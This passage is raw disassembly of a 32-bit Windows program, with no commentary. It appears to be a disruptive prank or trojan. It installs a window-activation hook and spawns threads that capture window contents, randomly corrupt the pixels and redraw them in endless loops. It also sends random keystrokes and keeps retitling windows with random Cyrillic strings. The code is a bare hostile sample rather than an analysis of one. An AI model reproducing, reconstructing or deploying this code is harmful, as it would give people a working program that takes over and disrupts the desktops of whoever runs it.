  401813:	83 ec 04             	sub    $0x4,%esp
  401816:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40181d:	00 
  40181e:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
  401825:	00 
  401826:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40182d:	00 
  40182e:	c7 04 24 10 00 00 00 	movl   $0x10,(%esp)
  401835:	a1 e4 b4 42 00       	mov    0x42b4e4,%eax
  40183a:	ff d0                	call   *%eax
  40183c:	83 ec 10             	sub    $0x10,%esp
  40183f:	c7 04 24 0a 00 00 00 	movl   $0xa,(%esp)
  401846:	a1 ac b3 42 00       	mov    0x42b3ac,%eax
  40184b:	ff d0                	call   *%eax
  40184d:	83 ec 04             	sub    $0x4,%esp
  401850:	e8 33 e6 00 00       	call   0x40fe88
  401855:	89 c1                	mov    %eax,%ecx
  401857:	ba 4f ec c4 4e       	mov    $0x4ec4ec4f,%edx
  40185c:	89 c8                	mov    %ecx,%eax
  40185e:	f7 ea                	imul   %edx
  401860:	c1 fa 03             	sar    $0x3,%edx
  401863:	89 c8                	mov    %ecx,%eax
  401865:	c1 f8 1f             	sar    $0x1f,%eax
  401868:	29 c2                	sub    %eax,%edx
  40186a:	89 d0                	mov    %edx,%eax
  40186c:	6b c0 1a             	imul   $0x1a,%eax,%eax
  40186f:	29 c1                	sub    %eax,%ecx
  401871:	89 c8                	mov    %ecx,%eax
  401873:	83 c0 41             	add    $0x41,%eax
  401876:	0f b6 c0             	movzbl %al,%eax
  401879:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  401880:	00 
  401881:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401888:	00 
  401889:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401890:	00 
  401891:	89 04 24             	mov    %eax,(%esp)
  401894:	a1 e4 b4 42 00       	mov    0x42b4e4,%eax
  401899:	ff d0                	call   *%eax
  40189b:	83 ec 10             	sub    $0x10,%esp
  40189e:	c7 04 24 0a 00 00 00 	movl   $0xa,(%esp)
  4018a5:	a1 ac b3 42 00       	mov    0x42b3ac,%eax
  4018aa:	ff d0                	call   *%eax
  4018ac:	83 ec 04             	sub    $0x4,%esp
  4018af:	e9 5e fe ff ff       	jmp    0x401712
  4018b4:	55                   	push   %ebp
  4018b5:	89 e5                	mov    %esp,%ebp
  4018b7:	83 ec 38             	sub    $0x38,%esp
  4018ba:	a1 20 a0 42 00       	mov    0x42a020,%eax
  4018bf:	85 c0                	test   %eax,%eax
  4018c1:	75 48                	jne    0x40190b
  4018c3:	c7 44 24 10 40 00 00 	movl   $0xf0000040,0x10(%esp)
  4018ca:	f0 
  4018cb:	c7 44 24 0c 01 00 00 	movl   $0x1,0xc(%esp)
  4018d2:	00 
  4018d3:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4018da:	00 
  4018db:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4018e2:	00 
  4018e3:	c7 04 24 20 a0 42 00 	movl   $0x42a020,(%esp)
  4018ea:	a1 cc b2 42 00       	mov    0x42b2cc,%eax
  4018ef:	ff d0                	call   *%eax
  4018f1:	83 ec 14             	sub    $0x14,%esp
  4018f4:	85 c0                	test   %eax,%eax
  4018f6:	0f 94 c0             	sete   %al
  4018f9:	84 c0                	test   %al,%al
  4018fb:	74 0e                	je     0x40190b
  4018fd:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  401904:	a1 28 b3 42 00       	mov    0x42b328,%eax
  401909:	ff d0                	call   *%eax
  40190b:	a1 20 a0 42 00       	mov    0x42a020,%eax
  401910:	8d 55 f4             	lea    -0xc(%ebp),%edx
  401913:	89 54 24 08          	mov    %edx,0x8(%esp)
  401917:	c7 44 24 04 04 00 00 	movl   $0x4,0x4(%esp)
  40191e:	00 
  40191f:	89 04 24             	mov    %eax,(%esp)
  401922:	a1 d0 b2 42 00       	mov    0x42b2d0,%eax
  401927:	ff d0                	call   *%eax
  401929:	83 ec 0c             	sub    $0xc,%esp
  40192c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40192f:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  401934:	c9                   	leave
  401935:	c3                   	ret
  401936:	55                   	push   %ebp
  401937:	89 e5                	mov    %esp,%ebp
  401939:	53                   	push   %ebx
  40193a:	83 ec 24             	sub    $0x24,%esp
  40193d:	8b 45 08             	mov    0x8(%ebp),%eax
  401940:	83 c0 01             	add    $0x1,%eax
  401943:	3d 00 00 80 3f       	cmp    $0x3f800000,%eax
  401948:	77 04                	ja     0x40194e
  40194a:	01 c0                	add    %eax,%eax
  40194c:	eb 05                	jmp    0x401953
  40194e:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401953:	89 04 24             	mov    %eax,(%esp)
  401956:	e8 a5 6d 01 00       	call   0x418700
  40195b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40195e:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  401965:	eb 2f                	jmp    0x401996
  401967:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40196a:	8d 14 00             	lea    (%eax,%eax,1),%edx
  40196d:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401970:	8d 1c 02             	lea    (%edx,%eax,1),%ebx
  401973:	e8 3c ff ff ff       	call   0x4018b4
  401978:	89 c2                	mov    %eax,%edx
  40197a:	89 d0                	mov    %edx,%eax
  40197c:	c1 f8 1f             	sar    $0x1f,%eax
  40197f:	c1 e8 18             	shr    $0x18,%eax
  401982:	01 c2                	add    %eax,%edx
  401984:	0f b6 d2             	movzbl %dl,%edx
  401987:	29 c2                	sub    %eax,%edx
  401989:	89 d0                	mov    %edx,%eax
  40198b:	66 05 00 04          	add    $0x400,%ax
  40198f:	66 89 03             	mov    %ax,(%ebx)
  401992:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  401996:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401999:	3b 45 08             	cmp    0x8(%ebp),%eax
  40199c:	7c c9                	jl     0x401967
  40199e:	8b 45 08             	mov    0x8(%ebp),%eax
  4019a1:	8d 14 00             	lea    (%eax,%eax,1),%edx
  4019a4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4019a7:	01 d0                	add    %edx,%eax
  4019a9:	66 c7 00 00 00       	movw   $0x0,(%eax)
  4019ae:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4019b1:	83 c4 24             	add    $0x24,%esp
  4019b4:	5b                   	pop    %ebx
  4019b5:	5d                   	pop    %ebp
  4019b6:	c3                   	ret
  4019b7:	55                   	push   %ebp
  4019b8:	89 e5                	mov    %esp,%ebp
  4019ba:	83 ec 18             	sub    $0x18,%esp
  4019bd:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4019c4:	00 
  4019c5:	8b 45 08             	mov    0x8(%ebp),%eax
  4019c8:	89 04 24             	mov    %eax,(%esp)
  4019cb:	a1 dc b4 42 00       	mov    0x42b4dc,%eax
  4019d0:	ff d0                	call   *%eax
  4019d2:	83 ec 08             	sub    $0x8,%esp
  4019d5:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4019dc:	00 
  4019dd:	8b 45 08             	mov    0x8(%ebp),%eax
  4019e0:	89 04 24             	mov    %eax,(%esp)
  4019e3:	a1 ac b4 42 00       	mov    0x42b4ac,%eax
  4019e8:	ff d0                	call   *%eax
  4019ea:	83 ec 08             	sub    $0x8,%esp
  4019ed:	b8 01 00 00 00       	mov    $0x1,%eax
  4019f2:	c9                   	leave
  4019f3:	c2 08 00             	ret    $0x8
  4019f6:	55                   	push   %ebp
  4019f7:	89 e5                	mov    %esp,%ebp
  4019f9:	83 ec 58             	sub    $0x58,%esp
  4019fc:	a1 30 a0 42 00       	mov    0x42a030,%eax
  401a01:	8d 50 01             	lea    0x1(%eax),%edx
  401a04:	a1 2c a0 42 00       	mov    0x42a02c,%eax
  401a09:	0f af c2             	imul   %edx,%eax
  401a0c:	c1 e0 02             	shl    $0x2,%eax
  401a0f:	c7 44 24 0c 04 00 00 	movl   $0x4,0xc(%esp)
  401a16:	00 
  401a17:	c7 44 24 08 00 30 00 	movl   $0x3000,0x8(%esp)
  401a1e:	00 
  401a1f:	89 44 24 04          	mov    %eax,0x4(%esp)
  401a23:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401a2a:	a1 d0 b3 42 00       	mov    0x42b3d0,%eax
  401a2f:	ff d0                	call   *%eax
  401a31:	83 ec 10             	sub    $0x10,%esp
  401a34:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401a37:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  401a3e:	a1 24 a0 42 00       	mov    0x42a024,%eax
  401a43:	89 04 24             	mov    %eax,(%esp)
  401a46:	a1 b4 b4 42 00       	mov    0x42b4b4,%eax
  401a4b:	ff d0                	call   *%eax
  401a4d:	83 ec 04             	sub    $0x4,%esp
  401a50:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401a53:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401a56:	89 04 24             	mov    %eax,(%esp)
  401a59:	a1 e8 b2 42 00       	mov    0x42b2e8,%eax
  401a5e:	ff d0                	call   *%eax
  401a60:	83 ec 04             	sub    $0x4,%esp
  401a63:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401a66:	8b 15 30 a0 42 00    	mov    0x42a030,%edx
  401a6c:	a1 2c a0 42 00       	mov    0x42a02c,%eax
  401a71:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401a74:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  401a78:	c7 44 24 0c 20 00 00 	movl   $0x20,0xc(%esp)
  401a7f:	00 
  401a80:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  401a87:	00 
  401a88:	89 54 24 04          	mov    %edx,0x4(%esp)
  401a8c:	89 04 24             	mov    %eax,(%esp)
  401a8f:	a1 e4 b2 42 00       	mov    0x42b2e4,%eax
  401a94:	ff d0                	call   *%eax
  401a96:	83 ec 14             	sub    $0x14,%esp
  401a99:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401a9c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401a9f:	89 44 24 04          	mov    %eax,0x4(%esp)
  401aa3:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401aa6:	89 04 24             	mov    %eax,(%esp)
  401aa9:	a1 f4 b2 42 00       	mov    0x42b2f4,%eax
  401aae:	ff d0                	call   *%eax
  401ab0:	83 ec 08             	sub    $0x8,%esp
  401ab3:	8b 15 30 a0 42 00    	mov    0x42a030,%edx
  401ab9:	a1 2c a0 42 00       	mov    0x42a02c,%eax
  401abe:	c7 44 24 20 28 03 44 	movl   $0x440328,0x20(%esp)
  401ac5:	00 
  401ac6:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  401acd:	00 
  401ace:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  401ad5:	00 
  401ad6:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401ad9:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  401add:	89 54 24 10          	mov    %edx,0x10(%esp)
  401ae1:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401ae5:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401aec:	00 
  401aed:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401af4:	00 
  401af5:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401af8:	89 04 24             	mov    %eax,(%esp)
  401afb:	a1 e0 b2 42 00       	mov    0x42b2e0,%eax
  401b00:	ff d0                	call   *%eax
  401b02:	83 ec 24             	sub    $0x24,%esp
  401b05:	a1 30 a0 42 00       	mov    0x42a030,%eax
  401b0a:	8d 14 85 00 00 00 00 	lea    0x0(,%eax,4),%edx
  401b11:	a1 2c a0 42 00       	mov    0x42a02c,%eax
  401b16:	0f af c2             	imul   %edx,%eax
  401b19:	8b 55 ec             	mov    -0x14(%ebp),%edx
  401b1c:	89 54 24 08          	mov    %edx,0x8(%esp)
  401b20:	89 44 24 04          	mov    %eax,0x4(%esp)
  401b24:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401b27:	89 04 24             	mov    %eax,(%esp)
  401b2a:	a1 f0 b2 42 00       	mov    0x42b2f0,%eax
  401b2f:	ff d0                	call   *%eax
  401b31:	83 ec 0c             	sub    $0xc,%esp
  401b34:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  401b3b:	e8 48 e3 00 00       	call   0x40fe88
  401b40:	89 c1                	mov    %eax,%ecx
  401b42:	ba 81 80 80 80       	mov    $0x80808081,%edx
  401b47:	89 c8                	mov    %ecx,%eax
  401b49:	f7 ea                	imul   %edx
  401b4b:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  401b4e:	c1 f8 07             	sar    $0x7,%eax
  401b51:	89 c2                	mov    %eax,%edx
  401b53:	89 c8                	mov    %ecx,%eax
  401b55:	c1 f8 1f             	sar    $0x1f,%eax
  401b58:	29 c2                	sub    %eax,%edx
  401b5a:	89 d0                	mov    %edx,%eax
  401b5c:	89 c2                	mov    %eax,%edx
  401b5e:	c1 e2 08             	shl    $0x8,%edx
  401b61:	29 c2                	sub    %eax,%edx
  401b63:	89 c8                	mov    %ecx,%eax
  401b65:	29 d0                	sub    %edx,%eax
  401b67:	88 45 db             	mov    %al,-0x25(%ebp)
  401b6a:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  401b71:	eb 61                	jmp    0x401bd4
  401b73:	e8 10 e3 00 00       	call   0x40fe88
  401b78:	89 c1                	mov    %eax,%ecx
  401b7a:	ba ef 23 b8 8f       	mov    $0x8fb823ef,%edx
  401b7f:	89 c8                	mov    %ecx,%eax
  401b81:	f7 ea                	imul   %edx
  401b83:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  401b86:	c1 f8 06             	sar    $0x6,%eax
  401b89:	89 c2                	mov    %eax,%edx
  401b8b:	89 c8                	mov    %ecx,%eax
  401b8d:	c1 f8 1f             	sar    $0x1f,%eax
  401b90:	29 c2                	sub    %eax,%edx
  401b92:	89 d0                	mov    %edx,%eax
  401b94:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401b97:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401b9a:	6b c0 72             	imul   $0x72,%eax,%eax
  401b9d:	29 c1                	sub    %eax,%ecx
  401b9f:	89 c8                	mov    %ecx,%eax
  401ba1:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401ba4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401ba7:	c1 e0 02             	shl    $0x2,%eax
  401baa:	89 c2                	mov    %eax,%edx
  401bac:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401baf:	01 c2                	add    %eax,%edx
  401bb1:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401bb4:	01 d0                	add    %edx,%eax
  401bb6:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401bb9:	c1 e2 02             	shl    $0x2,%edx
  401bbc:	89 d1                	mov    %edx,%ecx
  401bbe:	8b 55 dc             	mov    -0x24(%ebp),%edx
  401bc1:	01 d1                	add    %edx,%ecx
  401bc3:	8b 55 ec             	mov    -0x14(%ebp),%edx
  401bc6:	01 ca                	add    %ecx,%edx
  401bc8:	0f b6 12             	movzbl (%edx),%edx
  401bcb:	83 ea 05             	sub    $0x5,%edx
  401bce:	88 10                	mov    %dl,(%eax)
  401bd0:	83 45 f0 01          	addl   $0x1,-0x10(%ebp)
  401bd4:	8b 15 2c a0 42 00    	mov    0x42a02c,%edx
  401bda:	a1 30 a0 42 00       	mov    0x42a030,%eax
  401bdf:	0f af c2             	imul   %edx,%eax
  401be2:	3b 45 f0             	cmp    -0x10(%ebp),%eax
  401be5:	7f 8c                	jg     0x401b73
  401be7:	8b 15 2c a0 42 00    	mov    0x42a02c,%edx
  401bed:	a1 30 a0 42 00       	mov    0x42a030,%eax
  401bf2:	0f af c2             	imul   %edx,%eax
  401bf5:	c1 e0 02             	shl    $0x2,%eax
  401bf8:	89 c2                	mov    %eax,%edx
  401bfa:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401bfd:	89 44 24 08          	mov    %eax,0x8(%esp)
  401c01:	89 54 24 04          	mov    %edx,0x4(%esp)
  401c05:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401c08:	89 04 24             	mov    %eax,(%esp)
  401c0b:	a1 f8 b2 42 00       	mov    0x42b2f8,%eax
  401c10:	ff d0                	call   *%eax
  401c12:	83 ec 0c             	sub    $0xc,%esp
  401c15:	8b 15 30 a0 42 00    	mov    0x42a030,%edx
  401c1b:	a1 2c a0 42 00       	mov    0x42a02c,%eax
  401c20:	c7 44 24 20 28 03 44 	movl   $0x440328,0x20(%esp)
  401c27:	00 
  401c28:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  401c2f:	00 
  401c30:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  401c37:	00 
  401c38:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  401c3b:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  401c3f:	89 54 24 10          	mov    %edx,0x10(%esp)
  401c43:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401c47:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401c4e:	00 
  401c4f:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401c56:	00 
  401c57:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401c5a:	89 04 24             	mov    %eax,(%esp)
  401c5d:	a1 e0 b2 42 00       	mov    0x42b2e0,%eax
  401c62:	ff d0                	call   *%eax
  401c64:	83 ec 24             	sub    $0x24,%esp
  401c67:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401c6a:	89 04 24             	mov    %eax,(%esp)
  401c6d:	a1 ec b2 42 00       	mov    0x42b2ec,%eax
  401c72:	ff d0                	call   *%eax
  401c74:	83 ec 04             	sub    $0x4,%esp
  401c77:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401c7a:	89 04 24             	mov    %eax,(%esp)
  401c7d:	a1 ec b2 42 00       	mov    0x42b2ec,%eax
  401c82:	ff d0                	call   *%eax
  401c84:	83 ec 04             	sub    $0x4,%esp
  401c87:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401c8a:	89 44 24 04          	mov    %eax,0x4(%esp)
  401c8e:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401c95:	a1 cc b4 42 00       	mov    0x42b4cc,%eax
  401c9a:	ff d0                	call   *%eax
  401c9c:	83 ec 08             	sub    $0x8,%esp
  401c9f:	c7 04 24 05 00 00 00 	movl   $0x5,(%esp)
  401ca6:	a1 ac b3 42 00       	mov    0x42b3ac,%eax
  401cab:	ff d0                	call   *%eax
  401cad:	83 ec 04             	sub    $0x4,%esp
  401cb0:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  401cb4:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401cb7:	ba 56 55 55 55       	mov    $0x55555556,%edx
  401cbc:	89 c8                	mov    %ecx,%eax
  401cbe:	f7 ea                	imul   %edx
  401cc0:	89 c8                	mov    %ecx,%eax
  401cc2:	c1 f8 1f             	sar    $0x1f,%eax
  401cc5:	29 c2                	sub    %eax,%edx
  401cc7:	89 d0                	mov    %edx,%eax
  401cc9:	01 c0                	add    %eax,%eax
  401ccb:	01 d0                	add    %edx,%eax
  401ccd:	29 c1                	sub    %eax,%ecx
  401ccf:	89 c8                	mov    %ecx,%eax
  401cd1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401cd4:	e9 65 fd ff ff       	jmp    0x401a3e
  401cd9:	55                   	push   %ebp
  401cda:	89 e5                	mov    %esp,%ebp
  401cdc:	83 ec 38             	sub    $0x38,%esp
  401cdf:	83 7d 08 05          	cmpl   $0x5,0x8(%ebp)
  401ce3:	0f 85 9f 00 00 00    	jne    0x401d88
  401ce9:	8b 45 0c             	mov    0xc(%ebp),%eax
  401cec:	a3 24 a0 42 00       	mov    %eax,0x42a024
  401cf1:	a1 24 a0 42 00       	mov    0x42a024,%eax
  401cf6:	8d 55 e8             	lea    -0x18(%ebp),%edx
  401cf9:	89 54 24 04          	mov    %edx,0x4(%esp)
  401cfd:	89 04 24             	mov    %eax,(%esp)
  401d00:	a1 c0 b4 42 00       	mov    0x42b4c0,%eax
  401d05:	ff d0                	call   *%eax
  401d07:	83 ec 08             	sub    $0x8,%esp
  401d0a:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401d0d:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401d10:	29 c2                	sub    %eax,%edx
  401d12:	89 d0                	mov    %edx,%eax
  401d14:	a3 2c a0 42 00       	mov    %eax,0x42a02c
  401d19:	8b 55 f4             	mov    -0xc(%ebp),%edx
  401d1c:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401d1f:	29 c2                	sub    %eax,%edx
  401d21:	89 d0                	mov    %edx,%eax
  401d23:	a3 30 a0 42 00       	mov    %eax,0x42a030
  401d28:	a1 24 a0 42 00       	mov    0x42a024,%eax
  401d2d:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401d34:	00 
  401d35:	c7 44 24 04 b7 19 40 	movl   $0x4019b7,0x4(%esp)
  401d3c:	00 
  401d3d:	89 04 24             	mov    %eax,(%esp)
  401d40:	a1 b0 b4 42 00       	mov    0x42b4b0,%eax
  401d45:	ff d0                	call   *%eax
  401d47:	83 ec 0c             	sub    $0xc,%esp
  401d4a:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  401d51:	00 
  401d52:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  401d59:	00 
  401d5a:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  401d61:	00 
  401d62:	c7 44 24 08 f6 19 40 	movl   $0x4019f6,0x8(%esp)
  401d69:	00 
  401d6a:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401d71:	00 
  401d72:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401d79:	a1 18 b3 42 00       	mov    0x42b318,%eax
  401d7e:	ff d0                	call   *%eax
  401d80:	83 ec 18             	sub    $0x18,%esp
  401d83:	a3 28 a0 42 00       	mov    %eax,0x42a028
  401d88:	a1 34 a0 42 00       	mov    0x42a034,%eax
  401d8d:	8b 55 10             	mov    0x10(%ebp),%edx
  401d90:	89 54 24 0c          	mov    %edx,0xc(%esp)
  401d94:	8b 55 0c             	mov    0xc(%ebp),%edx
  401d97:	89 54 24 08          	mov    %edx,0x8(%esp)
  401d9b:	8b 55 08             	mov    0x8(%ebp),%edx
  401d9e:	89 54 24 04          	mov    %edx,0x4(%esp)
  401da2:	89 04 24             	mov    %eax,(%esp)
  401da5:	a1 a8 b4 42 00       	mov    0x42b4a8,%eax
  401daa:	ff d0                	call   *%eax
  401dac:	83 ec 10             	sub    $0x10,%esp
  401daf:	c9                   	leave
  401db0:	c2 0c 00             	ret    $0xc
  401db3:	55                   	push   %ebp
  401db4:	89 e5                	mov    %esp,%ebp
  401db6:	83 ec 18             	sub    $0x18,%esp
  401db9:	a1 48 b3 42 00       	mov    0x42b348,%eax
  401dbe:	ff d0                	call   *%eax
  401dc0:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401dc4:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401dcb:	00 
  401dcc:	c7 44 24 04 d9 1c 40 	movl   $0x401cd9,0x4(%esp)
  401dd3:	00 
  401dd4:	c7 04 24 05 00 00 00 	movl   $0x5,(%esp)
  401ddb:	a1 d8 b4 42 00       	mov    0x42b4d8,%eax
  401de0:	ff d0                	call   *%eax
  401de2:	83 ec 10             	sub    $0x10,%esp
  401de5:	a3 34 a0 42 00       	mov    %eax,0x42a034
  401dea:	c7 44 24 0c 12 00 00 	movl   $0x12,0xc(%esp)
  401df1:	00 
  401df2:	c7 44 24 08 1e f0 41 	movl   $0x41f01e,0x8(%esp)
  401df9:	00 
  401dfa:	c7 44 24 04 1e f0 41 	movl   $0x41f01e,0x4(%esp)
  401e01:	00 
  401e02:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401e09:	a1 c4 b4 42 00       	mov    0x42b4c4,%eax
  401e0e:	ff d0                	call   *%eax
  401e10:	83 ec 10             	sub    $0x10,%esp
  401e13:	a1 34 a0 42 00       	mov    0x42a034,%eax
  401e18:	85 c0                	test   %eax,%eax
  401e1a:	74 12                	je     0x401e2e
  401e1c:	a1 34 a0 42 00       	mov    0x42a034,%eax
  401e21:	89 04 24             	mov    %eax,(%esp)
  401e24:	a1 e0 b4 42 00       	mov    0x42b4e0,%eax
  401e29:	ff d0                	call   *%eax
  401e2b:	83 ec 04             	sub    $0x4,%esp
  401e2e:	a1 28 a0 42 00       	mov    0x42a028,%eax
  401e33:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401e3a:	00 
  401e3b:	89 04 24             	mov    %eax,(%esp)
  401e3e:	a1 b8 b3 42 00       	mov    0x42b3b8,%eax
  401e43:	ff d0                	call   *%eax
  401e45:	83 ec 08             	sub    $0x8,%esp
  401e48:	a1 28 a0 42 00       	mov    0x42a028,%eax
  401e4d:	89 04 24             	mov    %eax,(%esp)
  401e50:	a1 04 b3 42 00       	mov    0x42b304,%eax
  401e55:	ff d0                	call   *%eax
  401e57:	83 ec 04             	sub    $0x4,%esp
  401e5a:	c7 04 24 0a 00 00 00 	movl   $0xa,(%esp)
  401e61:	a1 ac b3 42 00       	mov    0x42b3ac,%eax
  401e66:	ff d0                	call   *%eax
  401e68:	83 ec 04             	sub    $0x4,%esp
  401e6b:	e9 49 ff ff ff       	jmp    0x401db9
  401e70:	55                   	push   %ebp
  401e71:	89 e5                	mov    %esp,%ebp
  401e73:	53                   	push   %ebx
  401e74:	83 ec 54             	sub    $0x54,%esp
  401e77:	e8 38 fa ff ff       	call   0x4018b4
  401e7c:	89 c1                	mov    %eax,%ecx
  401e7e:	ba 67 66 66 66       	mov    $0x66666667,%edx
  401e83:	89 c8                	mov    %ecx,%eax
  401e85:	f7 ea                	imul   %edx
  401e87:	c1 fa 02             	sar    $0x2,%edx
  401e8a:	89 c8                	mov    %ecx,%eax
  401e8c:	c1 f8 1f             	sar    $0x1f,%eax
  401e8f:	29 c2                	sub    %eax,%edx
  401e91:	89 d0                	mov    %edx,%eax
  401e93:	c1 e0 02             	shl    $0x2,%eax
  401e96:	01 d0                	add    %edx,%eax
  401e98:	01 c0                	add    %eax,%eax
  401e9a:	29 c1                	sub    %eax,%ecx
  401e9c:	89 ca                	mov    %ecx,%edx
  401e9e:	8d 42 0a             	lea    0xa(%edx),%eax
  401ea1:	89 04 24             	mov    %eax,(%esp)
  401ea4:	e8 8d fa ff ff       	call   0x401936
  401ea9:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  401eb0:	00 
  401eb1:	c7 44 24 14 64 00 00 	movl   $0x64,0x14(%esp)
  401eb8:	00 
  401eb9:	c7 44 24 10 02 00 00 	movl   $0x2,0x10(%esp)
  401ec0:	00 
  401ec1:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401ec5:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401ecc:	00 
  401ecd:	c7 44 24 04 0c 00 00 	movl   $0xc,0x4(%esp)
  401ed4:	00 
  401ed5:	8b 45 08             	mov    0x8(%ebp),%eax
  401ed8:	89 04 24             	mov    %eax,(%esp)
  401edb:	a1 d0 b4 42 00       	mov    0x42b4d0,%eax
  401ee0:	ff d0                	call   *%eax
  401ee2:	83 ec 1c             	sub    $0x1c,%esp
  401ee5:	8d 45 dc             	lea    -0x24(%ebp),%eax
  401ee8:	89 44 24 04          	mov    %eax,0x4(%esp)
  401eec:	8b 45 08             	mov    0x8(%ebp),%eax
  401eef:	89 04 24             	mov    %eax,(%esp)
  401ef2:	a1 c0 b4 42 00       	mov    0x42b4c0,%eax
  401ef7:	ff d0                	call   *%eax
  401ef9:	83 ec 08             	sub    $0x8,%esp
  401efc:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  401eff:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401f02:	29 c2                	sub    %eax,%edx
  401f04:	89 d0                	mov    %edx,%eax
  401f06:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401f09:	8b 55 e8             	mov    -0x18(%ebp),%edx
  401f0c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401f0f:	29 c2                	sub    %eax,%edx
  401f11:	89 d0                	mov    %edx,%eax
  401f13:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401f16:	8b 45 08             	mov    0x8(%ebp),%eax
  401f19:	89 04 24             	mov    %eax,(%esp)
  401f1c:	a1 b4 b4 42 00       	mov    0x42b4b4,%eax
  401f21:	ff d0                	call   *%eax
  401f23:	83 ec 04             	sub    $0x4,%esp
  401f26:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401f29:	e8 86 f9 ff ff       	call   0x4018b4
  401f2e:	89 c1                	mov    %eax,%ecx
  401f30:	ba 3f 06 e7 63       	mov    $0x63e7063f,%edx
  401f35:	89 c8                	mov    %ecx,%eax
  401f37:	f7 ea                	imul   %edx
  401f39:	c1 fa 04             	sar    $0x4,%edx
  401f3c:	89 c8                	mov    %ecx,%eax
  401f3e:	c1 f8 1f             	sar    $0x1f,%eax
  401f41:	29 c2                	sub    %eax,%edx
  401f43:	89 d0                	mov    %edx,%eax
  401f45:	c1 e0 02             	shl    $0x2,%eax
